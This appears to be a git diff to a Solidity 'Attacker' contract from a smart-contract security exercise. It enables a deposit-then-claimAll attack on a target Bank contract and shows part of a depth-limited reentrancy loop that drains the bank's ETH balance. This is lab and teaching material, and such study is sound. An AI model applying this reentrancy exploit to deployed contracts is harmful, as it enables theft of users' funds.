@@ -6,6 +6,9 @@ import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
 import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
 import "./Bank.sol";
 
+// remove after
+import "forge-std/console.sol";
+
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
 	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
@@ -38,12 +41,9 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
-/*
         emit Deposit(msg.value); // Emit event for the deposit amount
         bank.deposit{value: msg.value}();
         bank.claimAll();
-*/
-		
 	}
 
 	/*
@@ -69,7 +69,6 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
 
 		// Implement reentrancy with depth limit
-
         if (depth < max_depth && bank.balance > 0) {
 
 			console.log("Re-entering claimAll. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
